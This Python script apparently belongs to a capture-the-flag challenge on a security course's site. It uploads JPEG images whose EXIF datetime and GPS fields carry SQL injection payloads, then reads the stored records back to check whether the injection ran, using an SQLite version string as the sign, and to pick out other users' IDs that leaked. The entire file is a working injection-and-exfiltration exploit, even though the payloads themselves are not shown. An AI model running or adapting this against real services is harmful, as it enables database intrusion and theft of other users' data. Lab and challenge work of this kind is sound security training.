# upload_sweep2.py — upload f2_*.jpg (datetime/GPS payloads) and detect execution.
import requests, base64, glob, re, os
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"

files = sorted(glob.glob("f2_*.jpg"))
sent = {}
for f in files:
    marker = os.path.splitext(f)[0]
    uri = "data:image/jpeg;base64," + base64.b64encode(open(f,"rb").read()).decode()
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":marker,"user_id":UID})
    sent[marker]=r.status_code
    print(f"{f:20} -> {r.status_code}  {r.text[:50].strip()}")

print("\n--- readback: version string (3.x) = SQLi executed ---")
data = requests.get(f"{BASE}/images/{UID}").json()
verre = re.compile(r"3\.\d+\.\d+")
for img in data:
    d = img.get("description","")
    if d in sent:
        fields = {k: img.get(k) for k in ("make","model","datetime","summary_ocr","latitude","longitude")}
        hit = any(verre.search(str(v)) for v in fields.values())
        print(f"{d:12} {fields}" + ("   <<<<< EXECUTED" if hit else ""))
for img in data:
    for k in ("make","model","datetime","summary_ocr"):
        for m in re.findall(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", str(img.get(k,""))):
            if m != UID:
                print(f"  LEAK {k} id={img['id']}: {m}")
